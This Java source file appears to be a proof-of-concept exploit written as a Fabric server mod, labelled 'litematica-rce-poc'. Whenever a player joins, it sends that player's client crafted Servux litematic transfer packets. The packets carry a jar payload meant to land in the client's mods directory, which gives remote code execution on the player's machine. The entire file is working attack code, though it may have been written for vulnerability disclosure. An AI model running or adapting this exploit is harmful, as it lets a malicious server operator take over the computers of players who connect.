package dev.alienstoearth.litematica;

import io.netty.buffer.Unpooled;
import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.codec.StreamCodec;
import net.minecraft.network.protocol.common.custom.CustomPacketPayload;
import net.minecraft.resources.Identifier;
import net.minecraft.server.level.ServerPlayer;
import org.jspecify.annotations.NonNull;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.concurrent.atomic.AtomicBoolean;

public class LitematicaRceFabric implements DedicatedServerModInitializer {

    private static final Logger LOGGER = LoggerFactory.getLogger("litematica-rce-poc");

    static final Identifier CHANNEL_ID = Identifier.fromNamespaceAndPath("servux", "litematics");

    private static final int NBT_RESPONSE_DATA_TYPE = 11;

    private static final String TASK_START = "Litematic-TransmitStart";
    private static final String TASK_DATA = "Litematic-TransmitData";
    private static final String TASK_END = "Litematic-TransmitEnd";

    private static final String FILE_NAME = PayloadJar.FILE_NAME;

    public record RawPayload(byte[] data) implements CustomPacketPayload {
        public static final CustomPacketPayload.Type < RawPayload > TYPE =
                new CustomPacketPayload.Type < > (CHANNEL_ID);

        public static final StreamCodec < FriendlyByteBuf, RawPayload > CODEC =
                StreamCodec.of(
                        (buf, p) -> buf.writeBytes(p.data),
                        buf -> {
                            throw new UnsupportedOperationException("Not used on server");
                        }
                );

        @Override
        public @NonNull Type < ? extends CustomPacketPayload > type() {
            return TYPE;
        }
    }

    @Override
    public void onInitializeServer() {
        PayloadTypeRegistry.playS2C().register(RawPayload.TYPE, RawPayload.CODEC);

        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            ServerPlayer player = handler.getPlayer();
            scheduleOneShot(60, () -> triggerAttack(player));
        });

        LOGGER.info("LitematicaRceFabric initialized");
    }

    private void scheduleOneShot(int delayTicks, Runnable task) {
        final int[] counter = {
                delayTicks
        };
        final AtomicBoolean fired = new AtomicBoolean(false);
        ServerTickEvents.END_SERVER_TICK.register(server -> {
            if (fired.get()) return;
            if (counter[0]-- <= 0) {
                fired.set(true);
                task.run();
            }
        });
    }

    private void triggerAttack(ServerPlayer player) {
        LOGGER.info("=== RCE PoC targeting: {} ===", player.getGameProfile().name());

        long sliceKey = new java.util.Random().nextLong();

        LOGGER.info("FileName: {}  SliceKey: {}", FILE_NAME, sliceKey);

        CompoundTag startNbt = new CompoundTag();
        startNbt.putString("Task", TASK_START);
        startNbt.putLong("SliceKey", sliceKey);
        startNbt.putString("FileName", FILE_NAME);
        startNbt.putString("FileType", "litematic");
        startNbt.putInt("TotalSlices", 1);
        startNbt.putLong("TotalSize", PayloadJar.BYTES.length);

        CompoundTag dataNbt = new CompoundTag();
        dataNbt.putString("Task", TASK_DATA);
        dataNbt.putLong("SliceKey", sliceKey);
        dataNbt.putInt("Slice", 0);
        dataNbt.putInt("Size", PayloadJar.BYTES.length);
        dataNbt.putByteArray("Data", PayloadJar.BYTES);

        CompoundTag endNbt = new CompoundTag();
        endNbt.putString("Task", TASK_END);
        endNbt.putLong("SliceKey", sliceKey);
        endNbt.putInt("TotalSize", PayloadJar.BYTES.length);
        endNbt.putInt("TotalSlices", 1);

        byte[] startMsg = serializeMessage(startNbt);
        byte[] dataMsg = serializeMessage(dataNbt);
        byte[] endMsg = serializeMessage(endNbt);

        Runnable sendStart = () -> sendPacket(player, startMsg, "Start");
        Runnable sendData = () -> sendPacket(player, dataMsg, "Data");
        Runnable sendEnd = () -> sendPacket(player, endMsg, "End");

        sendStart.run();
        scheduleOneShot(2, sendData);
        scheduleOneShot(4, () -> {
            sendEnd.run();
            LOGGER.info("DONE - check client mods/ directory");
        });
    }

    private static byte[] serializeMessage(CompoundTag compound) {
        FriendlyByteBuf buf = new FriendlyByteBuf(Unpooled.buffer());
        writeVarInt(buf, 1);
        buf.writeNbt(compound);
        byte[] bytes = new byte[buf.readableBytes()];
        buf.readBytes(bytes);
        return bytes;
    }

    private static void sendPacket(ServerPlayer player, byte[] msgData, String label) {
        FriendlyByteBuf pktBuf = new FriendlyByteBuf(Unpooled.buffer());
        writeVarInt(pktBuf, msgData.length);
        pktBuf.writeBytes(msgData);

        FriendlyByteBuf wireBuf = new FriendlyByteBuf(Unpooled.buffer());
        writeVarInt(wireBuf, NBT_RESPONSE_DATA_TYPE);
        wireBuf.writeBytes(pktBuf);

        byte[] wireBytes = new byte[wireBuf.readableBytes()];
        wireBuf.readBytes(wireBytes);

        ServerPlayNetworking.send(player, new RawPayload(wireBytes));
        LOGGER.info("Sending Transmit{} ({} bytes)", label, wireBytes.length);
    }

    private static void writeVarInt(FriendlyByteBuf buf, int value) {
        while ((value & 0xFFFFFF80) != 0) {
            buf.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        buf.writeByte(value & 0x7F);
    }
}